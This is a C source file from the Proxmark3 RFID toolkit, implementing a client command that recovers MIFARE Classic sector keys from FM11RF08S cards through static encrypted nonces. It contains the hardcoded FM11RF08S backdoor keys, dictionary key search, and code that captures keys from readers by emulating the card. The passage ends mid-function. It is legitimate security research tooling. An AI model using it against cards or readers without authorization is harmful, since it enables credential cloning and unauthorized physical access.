//-----------------------------------------------------------------------------
// Copyright (C) Proxmark3 contributors. See AUTHORS.md for details.
//
// This program is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// (at your option) any later version.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// See LICENSE.txt for the text of the license.
//-----------------------------------------------------------------------------
// FM11RF08S static encrypted nonce recovery
// native client implementation by C2Pwn (github.com/C2Pwn)
//-----------------------------------------------------------------------------

#include "cmdhfmfsen.h"

#include <ctype.h>
#include <inttypes.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include "cmdhfmf.h"
#include "cmdparser.h"
#include "cliparser.h"
#include "commonutil.h"
#include "fileutils.h"
#include "mifare/mifare4.h"
#include "mifare/mifaredefault.h"
#include "mifare/mifarehost.h"
#include "util_posix.h"
#include "crapto1/crapto1.h"
#include "cmdhf14a.h"
#include "proxendian.h"
#include "preferences.h"
#include "parity.h"
#include "vec/vec.h"

#define FM11RF08S_SECTORS 17
#define FM11RF08S_NORMAL_SECTORS 16
#define FM11RF08S_GENERATED_KEY_LIMIT (1U << 18)
#define FM11RF08S_FCHK_KEYS_PER_SECOND 147U
/* max unique keys in the global-priority batch-fchk pass; above this the
 * per-sector dynamic loop is more efficient (cascade avoids the bulk scan) */
#define FM11RF08S_MAX_GLOBAL_PRIORITY_KEYS 8000U
#define FM11RF08S_DEFAULT_DICT "mfc_default_keys"

typedef enum {
    FM11_PHASE_COLLECT = 0,
    FM11_PHASE_GENERATE_1NT,
    FM11_PHASE_PARITY_FULL_FILTER,
    FM11_PHASE_MULTI_EVIDENCE_INTERSECT,
    FM11_PHASE_PAIR_SEED_INTERSECT,
    FM11_PHASE_REUSE_CLUSTER,
    FM11_PHASE_KNOWN_KEY_CHECK,
    FM11_PHASE_READER_MATERIAL,
    FM11_PHASE_OFFLINE_FIXPOINT,
    FM11_PHASE_ONLINE_CONFIRM
} fm11_phase_t;

typedef struct {
    uint64_t key;
    uint16_t seed;
    bool seed_valid;
} fm11_candidate_t;

typedef struct {
    fm11_candidate_t candidate;
    uint32_t score;
    uint32_t ordinal;
} fm11_scored_candidate_t;

typedef struct {
    uint64_t key;
    uint32_t sectors;
    uint32_t refs;
    uint32_t ordinal;
} fm11_reuse_priority_t;

typedef struct {
    fm11_candidate_t *data;
    uint32_t count;
    uint32_t cap;
} fm11_keylist_t;

typedef struct {
    uint64_t key;
    uint8_t sec;
    uint8_t key_type;
    uint32_t idx;
} fm11_candidate_ref_t;

typedef struct {
    uint64_t key;
    uint32_t start;
    uint32_t count;
} fm11_reuse_bucket_t;

typedef struct {
    fm11_candidate_ref_t *refs;
    fm11_reuse_bucket_t *buckets;
    uint32_t ref_count;
    uint32_t bucket_count;
} fm11_reuse_index_t;

typedef struct {
    uint32_t uid;
    uint8_t sec;
    uint8_t key_type;
    uint32_t nt;
    uint32_t nt_enc;
    uint8_t par_err;
    uint8_t parity_mask;
} fm11_evidence_t;

#define FM11_PROBE_QUEUE_MAX 128

typedef struct {
    uint8_t sec;
    uint8_t key_type;
    uint64_t key;
} fm11_probe_entry_t;

typedef struct {
    uint64_t key;
    uint8_t block_no;
    uint8_t key_type;
} fm11_initial_key_t;

typedef struct {
    fm11_probe_entry_t entries[FM11_PROBE_QUEUE_MAX];
    uint32_t count;
} fm11_probe_queue_t;

const uint8_t fm11_backdoor_keys[FM11_BACKDOOR_KEY_COUNT][MIFARE_KEY_SIZE] = {
    {0xA3, 0x96, 0xEF, 0xA4, 0xE2, 0x4F},
    {0xA3, 0x16, 0x67, 0xA8, 0xCE, 0xC1},
    {0x51, 0x8B, 0x33, 0x54, 0xE7, 0x60},
    {0x73, 0xB9, 0x83, 0x6C, 0xF1, 0x68},
};

static uint64_t fm11_sen_start_time  = 0;
static uint32_t fm11_sen_last_nonces = 0;
static size_t fm11_sen_inplace_len = 0;

static int fm11_verify_candidates(uint8_t real_sec, uint8_t key_type, const fm11_keylist_t *list, uint64_t *key_out);

static void fm11_wait_for_enter(const char *message) {
    PrintAndLogEx(INFO, "%s", message);
    while (kbd_enter_pressed()) {
        msleep(50);
    }
    while (kbd_enter_pressed() == false) {
        msleep(100);
    }
}

static void fm11_sen_format_eta(uint32_t seconds, char *out, size_t out_len) {
    if (seconds < 90) {
        snprintf(out, out_len, "%2us", seconds);
    } else if (seconds < 60 * 90) {
        snprintf(out, out_len, "%2umin", seconds / 60);
    } else if (seconds < 60 * 60 * 36) {
        snprintf(out, out_len, "%2uh", seconds / (60 * 60));
    } else {
        snprintf(out, out_len, "%2ud", seconds / (60 * 60 * 24));
    }
}

static void fm11_sen_progress_header(void) {
    fm11_sen_start_time = msclock();
    PrintAndLogEx(INFO, "---------+---------+---------------------------------------------------------+---------------------------+---------------");
    PrintAndLogEx(INFO, "         |         |                                                         | Expected to verify        | Estimated     ");
    PrintAndLogEx(INFO, " Time    | #nonces | Activity                                                | #keys/candidates          | time for task ");
    PrintAndLogEx(INFO, "---------+---------+---------------------------------------------------------+---------------------------+---------------");
    PrintAndLogEx(INFO, " " _YELLOW_("%7.0f") " | " _YELLOW_("%7u") " | %-55s | %25s | %13s ",
                  0.0, (uint32_t)0, "Start FM11RF08S static encrypted nonce recovery", "", "");
}

static void fm11_sen_progress(uint32_t nonces, const char *activity, uint32_t states, uint32_t eta_seconds) {
    char eta[16] = "";
    char states_text[24] = "";
    if (states > 0) {
        snprintf(states_text, sizeof(states_text), "%u", states);
    }
    if (eta_seconds > 0) {
        fm11_sen_format_eta(eta_seconds, eta, sizeof(eta));
    }
    const char *activity_text = activity ? activity : "";

    fm11_sen_last_nonces = nonces;
    uint64_t elapsed = fm11_sen_start_time ? (msclock() - fm11_sen_start_time) : 0;
    PrintAndLogEx(INFO, " " _YELLOW_("%7.0f") " | " _YELLOW_("%7u") " | %-55.55s | " _YELLOW_("%25s") " | " _YELLOW_("%13s") " ",
                  (float)elapsed / 1000.0,
                  nonces,
                  activity_text,
                  states_text,
                  eta);
}

static void fm11_sen_inplace_row(const char *row) {
    if (row == NULL) {
        return;
    }
    static uint8_t spinidx = 0;
    static const char spinner[] = {'\\', '|', '/', '-'};

    char out[MAX_PRINT_BUFFER] = {0};
    snprintf(out, sizeof(out), "[" _YELLOW_("%c") "] %s", spinner[spinidx], row);
    spinidx = (spinidx + 1) % ARRAYLEN(spinner);

    char filtered[MAX_PRINT_BUFFER] = {0};
    char rendered[MAX_PRINT_BUFFER] = {0};
    memcpy_filter_ansi(filtered, out, sizeof(filtered), !g_session.supports_colors);
    memcpy_filter_emoji(rendered, filtered, sizeof(rendered), g_session.emoji_mode);

    size_t len = strlen(rendered);
    pthread_mutex_lock(&g_print_lock);
    fprintf(stdout, "\r%s", rendered);
    if (fm11_sen_inplace_len > len) {
        fprintf(stdout, "%*s", (int)(fm11_sen_inplace_len - len), "");
    }
    fflush(stdout);
    fm11_sen_inplace_len = len;
    pthread_mutex_unlock(&g_print_lock);
}

static void fm11_sen_clear_inplace(void) {
    if (fm11_sen_inplace_len == 0) {
        return;
    }
    pthread_mutex_lock(&g_print_lock);
    fprintf(stdout, "\r");
    fflush(stdout);
    fm11_sen_inplace_len = 0;
    pthread_mutex_unlock(&g_print_lock);
}

static void fm11_sen_finish_inplace(void) {
    if (fm11_sen_inplace_len == 0) {
        return;
    }
    pthread_mutex_lock(&g_print_lock);
    fprintf(stdout, "\n");
    fflush(stdout);
    fm11_sen_inplace_len = 0;
    pthread_mutex_unlock(&g_print_lock);
}

static void fm11_render_bar(char *out, size_t out_len, uint32_t done, uint32_t total) {
    enum { BAR_WIDTH = 20 };
    static const char hash_str[] = "####################";
    static const char dot_str[]  = "....................";
    total = MAX(total, done);
    uint8_t filled = (total == 0) ? BAR_WIDTH : (uint8_t)(((uint64_t)done * BAR_WIDTH) / total);
    if (filled > BAR_WIDTH) filled = BAR_WIDTH;
    uint8_t empty = BAR_WIDTH - filled;
    snprintf(out, out_len, _GREEN_("%.*s") "%.*s", filled, hash_str, empty, dot_str);
}

static void fm11_sen_candidate_progress(uint8_t real_sec, uint8_t key_type, uint32_t tested, uint32_t total) {
    total = MAX(total, tested);
    char bar[80] = {0};
    fm11_render_bar(bar, sizeof(bar), tested, total);

    uint32_t pct = (total == 0) ? 100 : (uint32_t)(((uint64_t)tested * 100) / total);
    uint64_t elapsed = fm11_sen_start_time ? (msclock() - fm11_sen_start_time) : 0;

    char row[256] = {0};
    snprintf(row, sizeof(row),
             " " _YELLOW_("%7.0f") " | " _YELLOW_("%7u") " | sec " _CYAN_("%03u") " key " _GREEN_("%c") " [%s] " _YELLOW_("%6u") "/" _YELLOW_("%-6u") " " _YELLOW_("%3u%%") " | " _YELLOW_("%25u") " | %13s ",
             (float)elapsed / 1000.0,
             fm11_sen_last_nonces,
             real_sec, key_type ? 'B' : 'A',
             bar, tested, total, pct,
             total, "");
    fm11_sen_inplace_row(row);
}

static void fm11_sen_keycheck_progress(const char *prefix, uint8_t real_sec, uint8_t key_type,
                                       uint32_t tested, uint32_t total, uint32_t states) {
    total = MAX(total, tested);
    char bar[80] = {0};
    fm11_render_bar(bar, sizeof(bar), tested, total);

    uint32_t pct = (total == 0) ? 100 : (uint32_t)(((uint64_t)tested * 100) / total);
    uint64_t elapsed = fm11_sen_start_time ? (msclock() - fm11_sen_start_time) : 0;
    const char *text = prefix ? prefix : "chk";

    char row[256] = {0};
    snprintf(row, sizeof(row),
             " " _YELLOW_("%7.0f") " | " _YELLOW_("%7u") " | %-3.3s " _CYAN_("%03u") " key " _GREEN_("%c") " [%s] " _YELLOW_("%6u") "/" _YELLOW_("%-6u") " " _YELLOW_("%3u%%") " | " _YELLOW_("%25u") " | %13s ",
             (float)elapsed / 1000.0,
             fm11_sen_last_nonces,
             text, real_sec, key_type ? 'B' : 'A',
             bar, tested, total, pct,
             states, "");
    fm11_sen_inplace_row(row);
}

static void fm11_sen_compute_progress(const char *activity, uint32_t done, uint32_t total, uint32_t states) {
    total = MAX(total, done);
    char bar[80] = {0};
    fm11_render_bar(bar, sizeof(bar), done, total);

    uint32_t pct = (total == 0) ? 100 : (uint32_t)(((uint64_t)done * 100) / total);
    uint64_t elapsed = fm11_sen_start_time ? (msclock() - fm11_sen_start_time) : 0;
    const char *text = activity ? activity : "Compute";

    char row[256] = {0};
    snprintf(row, sizeof(row),
             " " _YELLOW_("%7.0f") " | " _YELLOW_("%7u") " | " _CYAN_("%-12.12s") " [%s] " _YELLOW_("%6u") "/" _YELLOW_("%-6u") " " _YELLOW_("%3u%%") "  | " _YELLOW_("%25u") " | %13s ",
             (float)elapsed / 1000.0,
             fm11_sen_last_nonces,
             text,
             bar, done, total, pct,
             states, "");
    fm11_sen_inplace_row(row);
}

static void fm11_sen_progress_footer(void) {
    PrintAndLogEx(INFO, "---------+---------+---------------------------------------------------------+---------------------------+---------------");
}

static bool fm11_digest_reader_nonce(const nonces_t *data,
                                     uint64_t reader_keys[FM11RF08S_NORMAL_SECTORS][2],
                                     bool reader_found[FM11RF08S_NORMAL_SECTORS][2],
                                     uint32_t *new_keys) {
    if (data == NULL || reader_keys == NULL || reader_found == NULL) {
        return false;
    }

    uint64_t key = 0;
    bool found = false;
    if ((nonce_state)data->state == SECOND) {
        found = mfkey32_moebius((nonces_t *)data, &key);
    } else if ((nonce_state)data->state == NESTED) {
        found = mfkey32_nested((nonces_t *)data, &key);
    }
    if (found == false || data->sector >= FM11RF08S_NORMAL_SECTORS || data->keytype > MF_KEY_B) {
        return false;
    }

    key &= 0xFFFFFFFFFFFFULL;
    if (reader_found[data->sector][data->keytype] == false || reader_keys[data->sector][data->keytype] != key) {
        reader_keys[data->sector][data->keytype] = key;
        reader_found[data->sector][data->keytype] = true;
        if (new_keys != NULL) {
            (*new_keys)++;
        }
        PrintAndLogEx(SUCCESS, "Reader material recovered sec " _CYAN_("%03u") " key " _GREEN_("%c") " = " _GREEN_("%012" PRIX64),
                      data->sector, data->keytype ? 'B' : 'A', key);
    }

    uint8_t mem_block[MFBLOCK_SIZE] = {0};
    if (mf_eml_get_mem(mem_block, (data->sector * 4) + 3, 1) == PM3_SUCCESS) {
        if ((mem_block[6] == 0) && (mem_block[7] == 0) && (mem_block[8] == 0)) {
            mem_block[6] = 0xFF;
            mem_block[7] = 0x07;
            mem_block[8] = 0x80;
        }
        num_to_bytes(key, MIFARE_KEY_SIZE, mem_block + (data->keytype ? 10 : 0));
        mf_elm_set_mem(mem_block, (data->sector * 4) + 3, 1);
    }
    return true;
}

static int fm11_collect_reader_material(const iso14a_card_select_t *card,
                                        uint64_t reader_keys[FM11RF08S_NORMAL_SECTORS][2],
                                        bool reader_found[FM11RF08S_NORMAL_SECTORS][2]) {
    if (card == NULL || reader_keys == NULL || reader_found == NULL) {
        return PM3_EINVARG;
    }

    uint16_t flags = FLAG_INTERACTIVE | FLAG_NR_AR_ATTACK | FLAG_NESTED_AUTH_ATTACK;
    FLAG_SET_MF_SIZE(flags, MIFARE_1K_MAX_BYTES);
    FLAG_SET_UID_IN_DATA(flags, card->uidlen);
    flags |= FLAG_ATQA_IN_DATA | FLAG_SAK_IN_DATA;

    struct {
        uint16_t flags;
        uint8_t exitAfter;
        uint8_t uid[10];
        uint16_t atqa;
        uint8_t sak;
    } PACKED payload = {0};

    payload.flags = flags;
    payload.exitAfter = 0;
    memcpy(payload.uid, card->uid, card->uidlen);
    payload.atqa = (card->atqa[1] << 8) | card->atqa[0];
    payload.sak = card->sak;

    DropField();
    clearCommandBuffer();
    PrintAndLogEx(INFO, "Reader pre-pass: emulate UID %s, present the Proxmark3 to the reader", sprint_hex_inrow(card->uid, card->uidlen));
    PrintAndLogEx(INFO, "Press " _GREEN_("Enter") " after the reader attempts are captured");

    uint32_t recovered = 0;
    while (kbd_enter_pressed()) {
        msleep(50);
    }

    while (kbd_enter_pressed() == false) {
        SendCommandNG(CMD_HF_MIFARE_SIMULATE, (uint8_t *)&payload, sizeof(payload));

        PacketResponseNG resp;
        while (kbd_enter_pressed() == false) {
            if (WaitForResponseTimeout(CMD_HF_MIFARE_SIMULATE, &resp, 1000) == false) {
                continue;
            }
            if (resp.status == PM3_EOPABORTED) {
                break;
            }
            if (resp.status != PM3_SUCCESS) {
                break;
            }
            const nonces_t *data = (const nonces_t *)resp.data.asBytes;
            fm11_digest_reader_nonce(data, reader_keys, reader_found, &recovered);
            break;
        }
    }

    SendCommandNG(CMD_BREAK_LOOP, NULL, 0);
    PrintAndLogEx(INFO, "Reader pre-pass digested %u recovered key%s", recovered, (recovered == 1) ? "" : "s");
    return PM3_SUCCESS;
}

static void fm11_keylist_free(fm11_keylist_t *list) {
    if (list == NULL) {
        return;
    }
    free(list->data);
    list->data = NULL;
    list->count = 0;
    list->cap = 0;
}

static int fm11_keylist_push(fm11_keylist_t *list, uint64_t key, uint16_t seed) {
    if (list == NULL) {
        return PM3_EINVARG;
    }
    if (list->count == list->cap) {
        uint32_t new_cap = (list->cap == 0) ? 1024 : list->cap * 2;
        fm11_candidate_t *tmp = realloc(list->data, new_cap * sizeof(fm11_candidate_t));
        if (tmp == NULL) {
            return PM3_EMALLOC;
        }
        list->data = tmp;
        list->cap = new_cap;
    }
    list->data[list->count++] = (fm11_candidate_t) {
        .key = key & 0xFFFFFFFFFFFFULL,
        .seed = seed,
        .seed_valid = false,
    };
    return PM3_SUCCESS;
}

static int fm11_keylist_push_seeded(fm11_keylist_t *list, uint64_t key, uint16_t seed) {
    int res = fm11_keylist_push(list, key, seed);
    if (res == PM3_SUCCESS) {
        list->data[list->count - 1].seed_valid = true;
    }
    return res;
}

static int fm11_cmp_candidate_key(const void *a, const void *b) {
    const fm11_candidate_t *ca = (const fm11_candidate_t *)a;
    const fm11_candidate_t *cb = (const fm11_candidate_t *)b;
    if (ca->key < cb->key) {
        return -1;
    }
    if (ca->key > cb->key) {
        return 1;
    }
    return 0;
}

static void fm11_keylist_sort(fm11_keylist_t *list) {
    if (list == NULL || list->count < 2 || list->data == NULL) {
        return;
    }
    qsort(list->data, list->count, sizeof(fm11_candidate_t), fm11_cmp_candidate_key);
}

static void fm11_prioritize_0000_prefix(fm11_keylist_t *list) {
    fm11_keylist_sort(list);
}

static int fm11_keylist_reserve(fm11_keylist_t *list, uint32_t cap) {
    if (list == NULL) {
        return PM3_EINVARG;
    }
    if (list->cap >= cap) {
        return PM3_SUCCESS;
    }
    fm11_candidate_t *tmp = realloc(list->data, cap * sizeof(fm11_candidate_t));
    if (tmp == NULL) {
        return PM3_EMALLOC;
    }
    list->data = tmp;
    list->cap = cap;
    return PM3_SUCCESS;
}

static bool fm11_keylist_has_key(const fm11_keylist_t *list, uint64_t key) {
    if (list == NULL) {
        return false;
    }
    key &= 0xFFFFFFFFFFFFULL;
    for (uint32_t i = 0; i < list->count; i++) {
        if (list->data[i].key == key) {
            return true;
        }
    }
    return false;
}

static int fm11_keylist_add_unique(fm11_keylist_t *list, uint64_t key) {
    if (fm11_keylist_has_key(list, key)) {
        return PM3_SUCCESS;
    }
    return fm11_keylist_push(list, key, 0);
}

static int fm11_load_default_keys(fm11_keylist_t *defaults) {
    if (defaults == NULL) {
        return PM3_EINVARG;
    }

    for (uint32_t d = 0; d < ARRAYLEN(g_mifare_default_keys); d++) {
        int res = fm11_keylist_add_unique(defaults, g_mifare_default_keys[d]);
        if (res != PM3_SUCCESS) {
            return res;
        }
    }

    uint8_t *dict_keys = NULL;
    uint32_t dict_count = 0;
    int res = loadFileDICTIONARY_safe_ex(FM11RF08S_DEFAULT_DICT, ".dic", (void **)&dict_keys,
                                         MIFARE_KEY_SIZE, &dict_count, false);
    if (res != PM3_SUCCESS) {
        return PM3_SUCCESS;
    }

    for (uint32_t i = 0; i < dict_count; i++) {
        uint64_t key = bytes_to_num(dict_keys + (i * MIFARE_KEY_SIZE), MIFARE_KEY_SIZE);
        res = fm11_keylist_add_unique(defaults, key);
        if (res != PM3_SUCCESS) {
            free(dict_keys);
            return res;
        }
    }
    free(dict_keys);
    return PM3_SUCCESS;
}

static bool fm11_keylist_promote_existing(fm11_keylist_t *list, uint64_t key) {
    if (list == NULL) {
        return false;
    }
    key &= 0xFFFFFFFFFFFFULL;
    for (uint32_t i = 0; i < list->count; i++) {
        if (list->data[i].key == key) {
            if (i != 0) {
                fm11_candidate_t tmp = list->data[i];
                memmove(list->data + 1, list->data, i * sizeof(fm11_candidate_t));
                list->data[0] = tmp;
            }
            return true;
        }
    }
    return false;
}

static bool fm11_keylist_promote_existing_hint(fm11_keylist_t *list, uint64_t key, uint32_t idx_hint) {
    if (list == NULL) {
        return false;
    }
    key &= 0xFFFFFFFFFFFFULL;
    if (idx_hint < list->count && list->data[idx_hint].key == key) {
        if (idx_hint != 0) {
            fm11_candidate_t tmp = list->data[idx_hint];
            memmove(list->data + 1, list->data, idx_hint * sizeof(fm11_candidate_t));
            list->data[0] = tmp;
        }
        return true;
    }
    return fm11_keylist_promote_existing(list, key);
}

static int fm11_keylist_promote_or_prepend(fm11_keylist_t *list, uint64_t key) {
    if (list == NULL) {
        return PM3_EINVARG;
    }
    key &= 0xFFFFFFFFFFFFULL;
    if (fm11_keylist_promote_existing(list, key)) {
        return PM3_SUCCESS;
    }
    int res = fm11_keylist_reserve(list, list->count + 1);
    if (res != PM3_SUCCESS) {
        return res;
    }
    memmove(list->data + 1, list->data, list->count * sizeof(fm11_candidate_t));
    list->data[0] = (fm11_candidate_t) {
        .key = key,
        .seed = 0,
        .seed_valid = false,
    };
    list->count++;
    return PM3_SUCCESS;
}

static uint32_t fm11_bytes_to_u32(const uint8_t v[4]) {
    return ((uint32_t)v[0] << 24) | ((uint32_t)v[1] << 16) | ((uint32_t)v[2] << 8) | v[3];
}

static uint8_t fm11_real_sector(uint8_t sec) {
    return (sec < FM11RF08S_NORMAL_SECTORS) ? sec : sec + 16;
}

static uint32_t fm11_count_found_keys(const bool found_key[FM11RF08S_SECTORS][2]) {
    uint32_t found = 0;
    for (uint8_t sec = 0; sec < FM11RF08S_SECTORS; sec++) {
        found += found_key[sec][0] ? 1 : 0;
        found += found_key[sec][1] ? 1 : 0;
    }
    return found;
}

static uint32_t fm11_count_unfound_candidates(fm11_keylist_t candidates[FM11RF08S_SECTORS][2],
                                              const bool found_key[FM11RF08S_SECTORS][2]) {
    uint32_t total = 0;
    for (uint8_t sec = 0; sec < FM11RF08S_SECTORS; sec++) {
        for (uint8_t kt = 0; kt < 2; kt++) {
            if (found_key[sec][kt] == false) {
                total += candidates[sec][kt].count;
            }
        }
    }
    return total;
}

static int fm11_collect_nonces_ex(const uint8_t *key, uint32_t flags, uint8_t first_block_no, uint8_t first_key_type,
                                  iso14a_card_select_t *card, iso14a_fm11rf08s_nonces_with_data_t *nonces) {
    if (key == NULL || card == NULL || nonces == NULL) {
        return PM3_EINVARG;
    }

    clearCommandBuffer();
    SendCommandMIX(CMD_HF_ISO14443A_READER, ISO14A_CONNECT | ISO14A_CLEARTRACE, 0, 0, NULL, 0);
    PacketResponseNG resp;
    if (WaitForResponseTimeout(CMD_ACK, &resp, 2500) == false) {
        PrintAndLogEx(WARNING, "iso14443a card select timeout");
        return PM3_ETIMEOUT;
    }
    if (resp.oldarg[0] == 0) {
        PrintAndLogEx(WARNING, "iso14443a card select failed");
        return PM3_ESOFT;
    }
    memcpy(card, (iso14a_card_select_t *)resp.data.asBytes, sizeof(iso14a_card_select_t));

    clearCommandBuffer();
    SendCommandMIX(CMD_HF_MIFARE_ACQ_STATIC_ENCRYPTED_NONCES, flags, first_block_no, first_key_type, key, MIFARE_KEY_SIZE);
    if (WaitForResponseTimeout(CMD_ACK, &resp, 2500) == false) {
        PrintAndLogEx(WARNING, "Fail, transfer from device time-out");
        return PM3_ETIMEOUT;
    }
    if (resp.oldarg[0] != PM3_SUCCESS) {
        return PM3_ESOFT;
    }

    memset(nonces, 0, sizeof(*nonces));
    for (uint8_t sec = 0; sec < FM11RF08S_SECTORS; sec++) {
        uint32_t nt = bytes_to_num(resp.data.asBytes + ((sec * 2) * 8), 2);
        nt = (nt << 16) | prng_successor(nt, 16);
        num_to_bytes(nt, 4, nonces->nt[sec][0]);

        nt = bytes_to_num(resp.data.asBytes + (((sec * 2) + 1) * 8), 2);
        nt = (nt << 16) | prng_successor(nt, 16);
        num_to_bytes(nt, 4, nonces->nt[sec][1]);
    }
    for (uint8_t sec = 0; sec < FM11RF08S_SECTORS; sec++) {
        memcpy(nonces->nt_enc[sec][0], resp.data.asBytes + ((sec * 2) * 8) + 4, 4);
        memcpy(nonces->nt_enc[sec][1], resp.data.asBytes + (((sec * 2) + 1) * 8) + 4, 4);
        nonces->par_err[sec][0] = resp.data.asBytes[((sec * 2) * 8) + 2];
        nonces->par_err[sec][1] = resp.data.asBytes[(((sec * 2) + 1) * 8) + 2];
    }

    if ((flags & 1) == 0) {
        return PM3_SUCCESS;
    }

    uint8_t *dump = calloc(MIFARE_1K_MAXBLOCK, MFBLOCK_SIZE);
    if (dump == NULL) {
        return PM3_EMALLOC;
    }
    if (GetFromDevice(BIG_BUF_EML, dump, MIFARE_1K_MAXBLOCK * MFBLOCK_SIZE, 0, NULL, 0, NULL, 2500, false) == false) {
        free(dump);
        PrintAndLogEx(WARNING, "Fail, transfer from device time-out");
        return PM3_ETIMEOUT;
    }
    for (uint8_t blk = 0; blk < MIFARE_1K_MAXBLOCK; blk++) {
        memcpy(nonces->blocks[blk], dump + blk * MFBLOCK_SIZE, MFBLOCK_SIZE);
    }
    free(dump);
    return PM3_SUCCESS;
}

int fm11_collect_nonces(const uint8_t *key, iso14a_card_select_t *card, iso14a_fm11rf08s_nonces_with_data_t *nonces) {
    return fm11_collect_nonces_ex(key, 1, 0, MF_KEY_A, card, nonces);
}

static int fm11_try_initial_key_for_nonces(const fm11_initial_key_t *initial, iso14a_card_select_t *card,
                                           iso14a_fm11rf08s_nonces_with_data_t *nonces, uint8_t *active_key) {
    if (initial == NULL || card == NULL || nonces == NULL || active_key == NULL) {
        return PM3_EINVARG;
    }

    num_to_bytes(initial->key, MIFARE_KEY_SIZE, active_key);
    PrintAndLogEx(INFO, "Trying nonce collection with sector " _YELLOW_("%u") " block " _YELLOW_("%u")
                  " key " _YELLOW_("%c") " = " _GREEN_("%012" PRIX64),
                  mfSectorNum(initial->block_no), initial->block_no,
                  initial->key_type ? 'B' : 'A', initial->key);
    char activity[96];
    snprintf(activity, sizeof(activity), "Collect nonce evidence via block %u key %c %s",
             initial->block_no, initial->key_type ? 'B' : 'A', sprint_hex_inrow(active_key, MIFARE_KEY_SIZE));
    fm11_sen_progress(0, activity, 0, 0);
    return fm11_collect_nonces_ex(active_key, 2, initial->block_no, initial->key_type, card, nonces);
}

static int fm11_collect_nonces_from_default_key_fallback(const fm11_keylist_t *defaults, iso14a_card_select_t *card,
                                                         iso14a_fm11rf08s_nonces_with_data_t *nonces, uint8_t *active_key) {
    if (defaults == NULL || card == NULL || nonces == NULL || active_key == NULL) {
        return PM3_EINVARG;
    }
    if (defaults->count == 0) {
        return PM3_ESOFT;
    }

    sector_t *e_sector = calloc(FM11RF08S_NORMAL_SECTORS, sizeof(sector_t));
    if (e_sector == NULL) {
        return PM3_EMALLOC;
    }

    int retval = PM3_ESOFT;
    uint32_t total = defaults->count * (FM11RF08S_SECTORS * 2);
    uint32_t done = 0;

    PrintAndLogEx(INFO, "Searching " _YELLOW_("%u") " default/dictionary keys for an initial auth key", defaults->count);
    for (uint32_t idx = 0; idx < defaults->count && retval == PM3_ESOFT; idx += KEYS_IN_BLOCK) {
        if (kbd_enter_pressed()) {
            retval = PM3_EOPABORTED;
            break;
        }

        uint8_t key_block[KEYBLOCK_SIZE] = {0};
        uint8_t chunk = MIN(KEYS_IN_BLOCK, defaults->count - idx);
        for (uint8_t i = 0; i < chunk; i++) {
            num_to_bytes(defaults->data[idx + i].key, MIFARE_KEY_SIZE, key_block + (i * MIFARE_KEY_SIZE));
        }

        PrintAndLogEx(INFO, "Dictionary chunk " _YELLOW_("%u-%u") " / " _YELLOW_("%u") ": checking normal sectors",
                      idx + 1, idx + chunk, defaults->count);
        for (uint8_t strategy = 1; strategy < 3 && retval == PM3_ESOFT; strategy++) {
            PrintAndLogEx(INFO, "  fchk strategy " _YELLOW_("%u") " against sectors 0-15", strategy);
            memset(e_sector, 0, sizeof(sector_t) * FM11RF08S_NORMAL_SECTORS);
            int res = mf_check_keys_fast_ex(FM11RF08S_NORMAL_SECTORS, true, true, strategy, chunk,
                                            key_block, e_sector, false, false, true, 0);
            if (res == PM3_ETIMEOUT || res == PM3_EOPABORTED) {
                retval = res;
                break;
            }
            for (uint8_t sec = 0; sec < FM11RF08S_NORMAL_SECTORS && retval == PM3_ESOFT; sec++) {
                for (uint8_t kt = 0; kt < 2 && retval == PM3_ESOFT; kt++) {
                    if (e_sector[sec].foundKey[kt] == false) {
                        continue;
                    }
                    fm11_initial_key_t initial = {
                        .key = e_sector[sec].Key[kt] & 0xFFFFFFFFFFFFULL,
                        .block_no = mfFirstBlockOfSector(sec),
                        .key_type = kt,
                    };
                    PrintAndLogEx(SUCCESS, "Found initial key: sector " _YELLOW_("%u") " block " _YELLOW_("%u")
                                  " key " _YELLOW_("%c") " = " _GREEN_("%012" PRIX64),
                                  sec, initial.block_no, initial.key_type ? 'B' : 'A', initial.key);
                    int collect_res = fm11_try_initial_key_for_nonces(&initial, card, nonces, active_key);
                    if (collect_res == PM3_SUCCESS) {
                        retval = PM3_SUCCESS;
                        break;
                    }
                    if (collect_res == PM3_ETIMEOUT || collect_res == PM3_EOPABORTED) {
                        retval = collect_res;
                        break;
                    }
                    PrintAndLogEx(WARNING, "Initial key did not collect nonce evidence, continuing dictionary search");
                }
            }
        }
        done += chunk * FM11RF08S_NORMAL_SECTORS * 2;

        uint8_t real_sec32 = fm11_real_sector(FM11RF08S_SECTORS - 1);
        if (retval == PM3_ESOFT) {
            PrintAndLogEx(INFO, "Dictionary chunk " _YELLOW_("%u-%u") " / " _YELLOW_("%u")
                          ": checking FM11RF08S sector " _YELLOW_("%u"),
                          idx + 1, idx + chunk, defaults->count, real_sec32);
        }
        for (uint8_t kt = 0; kt < 2 && retval == PM3_ESOFT; kt++) {
            uint64_t out_key = 0;
            PrintAndLogEx(INFO, "  checking sector " _YELLOW_("%u") " key " _YELLOW_("%c"), real_sec32, kt ? 'B' : 'A');
            int res = mf_check_keys(mfFirstBlockOfSector(real_sec32), kt, false, chunk, key_block, &out_key);
            done += chunk;
            if (res == PM3_SUCCESS) {
                fm11_initial_key_t initial = {
                    .key = out_key & 0xFFFFFFFFFFFFULL,
                    .block_no = mfFirstBlockOfSector(real_sec32),
                    .key_type = kt,
                };
                PrintAndLogEx(SUCCESS, "Found initial key: sector " _YELLOW_("%u") " block " _YELLOW_("%u")
                              " key " _YELLOW_("%c") " = " _GREEN_("%012" PRIX64),
                              real_sec32, initial.block_no, initial.key_type ? 'B' : 'A', initial.key);
                int collect_res = fm11_try_initial_key_for_nonces(&initial, card, nonces, active_key);
                if (collect_res == PM3_SUCCESS) {
                    retval = PM3_SUCCESS;
                    break;
                }
                if (collect_res == PM3_ETIMEOUT || collect_res == PM3_EOPABORTED) {
                    retval = collect_res;
                    break;
                }
                PrintAndLogEx(WARNING, "Initial key did not collect nonce evidence, continuing dictionary search");
            }
            if (res == PM3_ETIMEOUT || res == PM3_EOPABORTED) {
                retval = res;
                break;
            }
        }
        fm11_sen_progress(0, "Search default-key dictionary for initial auth key", MIN(done, total), 0);
    }

    fm11_sen_clear_inplace();
    if (retval == PM3_ESOFT) {
